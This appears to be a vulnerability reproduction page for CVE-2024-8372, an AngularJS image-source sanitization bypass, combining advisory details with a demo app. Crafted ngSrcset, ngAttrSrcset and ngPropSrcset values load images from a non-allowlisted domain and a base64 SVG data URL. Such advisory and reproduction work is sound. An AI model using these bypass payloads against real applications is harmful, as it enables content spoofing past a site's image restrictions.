
<!DOCTYPE html>
<html lang='en' class=''>

<head>

  <meta charset='UTF-8'>
    <script src="../build/angular.js"></script>
    <script src="../build/angular-resource.js"></script>
    <script src="CVE-2024-8372.js"></script>
    <link rel="stylesheet" href="CVE-2024-8372.css" />
</head>
<h1>
  <small>Reproduction of AngularJS vulnerability:</small><br />
  <code>ng(Attr/Prop)Srcset</code> image source sanitization bypass
</h1>

<section class="vulnerability-info-section">
  <h2>Vulnerability information</h2>
  <table class="vulnerability-info-table">
    <tr>
      <th>CVE:</th>
      <td><a href="https://www.cve.org/CVERecord?id=CVE-2024-8372">CVE-2024-8372</a>
      <a href="https://codepen.io/herodevs/full/xxoQRNL/0072e627abe03e9cda373bc75b4c1017">CodePen</a>
      </td>
    </tr>
    <tr>
      <th>Type:</th>
      <td>Image source sanitization bypass (a form of <a href="https://owasp.org/www-community/attacks/Content_Spoofing">Content Spoofing</a>)</td>
    </tr>
    <tr>
      <th>Affected versions:</th>
      <td>&gt;=1.3.0-rc.4</td>
    </tr>
    <tr>
      <th>Fixed in version:</th>
      <td><a href="https://www.herodevs.com/support/nes-angularjs">AngularJS NES</a> v1.9.6 and v1.5.22</td>
    </tr>
    <tr>
      <th>Description:</th>
      <td>
        The logic used in the <a href="https://docs.angularjs.org/api/ng/directive/ngSrcset">ngSrcset</a>, <a href="https://docs.angularjs.org/guide/interpolation#-ngattr-for-binding-to-arbitrary-attributes">ngAttrSrcset</a> and <a href="https://docs.angularjs.org/api/ng/directive/ngProp">ngPropSrcset</a> directives to sanitize image source URLs has a vulnerability that allows bypassing the restrictions set by some common patterns, such as only allowing images from a specific domain. With a specially-crafted input, the <a href="https://docs.angularjs.org/api/ng/provider/$compileProvider#imgSrcSanitizationTrustedUrlList">sanitization</a> can be bypassed and images from an arbitrary domain can be shown, which can also lead to a form of <a href="https://owasp.org/www-community/attacks/Content_Spoofing">Content Spoofing</a>. Similarly, the app's performance and behavior can be negatively affected by using too large or slow-to-load images.

        <aside class="warn">
          <b>NOTE</b><br />
          This also affects setting <a href="https://docs.angularjs.org/guide/interpolation">interpolated</a> values via the <code>srcset</code> HTML attribute, which is not recommended in AngularJS anyway:
          <pre>
            &lt;img srcset="{{ 'some-malicious-input' }}" />
          </pre>
        </aside>
      </td>
    </tr>
  </table>
</section>

<section class="repro-instructions-section">
  <h2>Reproduction instructions</h2>
  <p>
    The app below demonstrates the issue by using some specially-crafted <code>ngSrcset</code>, <code>ngAttrSrcset</code> and <code>ngPropSrcset</code> values to bypass the image source sanitization restrictions and show images that should be blocked.
  </p>
  <p>
    For demonstration purposes, the app is configured to only allow images from the <code>https://angularjs.org/</code> domain:
    <pre>
      $compileProvider.imgSrcSanitizationTrustedUrlList(/^https:\/\/angularjs\.org\//);
    </pre>
  </p>
  <p>
    However, by taking advantage of the vulnerability, we are able to show images from other domains (e.g. <code>https://angular.dev/</code>) as well as different schemes (e.g. an arbitrary SVG image using the <code>data:image/svg+xml</code> format).
  </p>
  <p>
    <b>Steps:</b>
    <ol>
      <li>
        Take a look at the table below.
      </li>
      <li>
        For reference, the first 3 entries use the <code>ngSrc</code> directive (which is not vulnerable) and demonstrate that the image sources are sanitized correctly, only allowing images from <code>https://angularjs.org/</code> to show.
      </li>
      <li>
        In contrast, the last 6 entries use the <code>ngSrcset</code>, <code>ngAttrSrcset</code> and <code>ngPropSrcset</code> directives (with specially-crafted values), which allows us to bypass the sanitization and show images that should be blocked.
      </li>
    </ol>
  </p>
</section>

<section class="repro-content-section" ng-app="app">
  <h2>Reproduction</h2>
  <p class="repro-images">
    <span class="section-header">
      Examples with <code>ngSrc</code><br />
      (not vulnerable)
    </span>

    <span>
      Image from <code>angularjs.org</code>:<br />
      <b>ALLOWED</b> (Correct ✔️)
    </span>
    <img ng-src="https://angularjs.org/favicon.ico" />

    <span>
      Image from <code>angular.dev</code>:<br />
      <b>BLOCKED</b> (Correct ✔️)
    </span>
    <img ng-src="https://angular.dev/favicon.ico" />

    <span>
      Arbitrary SVG image via data URL:<br />
      <b>BLOCKED</b> (Correct ✔️)
    </span>
    <img ng-src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCBmb250LXNpemU9IjEwMCIgeT0iMWVtIj7wn5Cx4oCN8J+SuzwvdGV4dD48L3N2Zz4=" />

    <span class="section-header">
      Examples with <code>ngSrcset</code><br />
      (vulnerable)
    </span>

    <span>
      Image from <code>angular.dev</code>:<br />
      <b>ALLOWED</b> (Error ❌)
    </span>
    <img ng-srcset="https://angularjs.org/favicon.ico xyz,https://angular.dev/favicon.ico" />

    <span>
      Arbitrary SVG image via data URL<br />
      <b>ALLOWED</b> (Error ❌)
    </span>
    <img ng-srcset="https://angularjs.org/favicon.ico xyz,data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCBmb250LXNpemU9IjEwMCIgeT0iMWVtIj7wn5Cx4oCN8J+SuzwvdGV4dD48L3N2Zz4=" />

    <span class="section-header">
      Examples with <code>ngAttrSrcset</code><br />
      (vulnerable)
    </span>

    <span>
      Image from <code>angular.dev</code>:<br />
      <b>ALLOWED</b> (Error ❌)
    </span>
    <img ng-attr-srcset="https://angularjs.org/favicon.ico xyz,https://angular.dev/favicon.ico" />

    <span>
      Arbitrary SVG image via data URL:<br />
      <b>ALLOWED</b> (Error ❌)
    </span>
    <img ng-attr-srcset="https://angularjs.org/favicon.ico xyz,data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCBmb250LXNpemU9IjEwMCIgeT0iMWVtIj7wn5Cx4oCN8J+SuzwvdGV4dD48L3N2Zz4=" />

    <span class="section-header">
      Examples with <code>ngPropSrcset</code><br />
      (vulnerable)
    </span>

    <span>
      Image from <code>angular.dev</code>:<br />
      <b>ALLOWED</b> (Error ❌)
    </span>
    <img ng-prop-srcset="'https://angularjs.org/favicon.ico xyz,https://angular.dev/favicon.ico'" />

    <span>
      Arbitrary SVG image via data URL:<br />
      <b>ALLOWED</b> (Error ❌)
    </span>
    <img ng-prop-srcset="'https://angularjs.org/favicon.ico xyz,data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCBmb250LXNpemU9IjEwMCIgeT0iMWVtIj7wn5Cx4oCN8J+SuzwvdGV4dD48L3N2Zz4='" />
  </p>
</section>
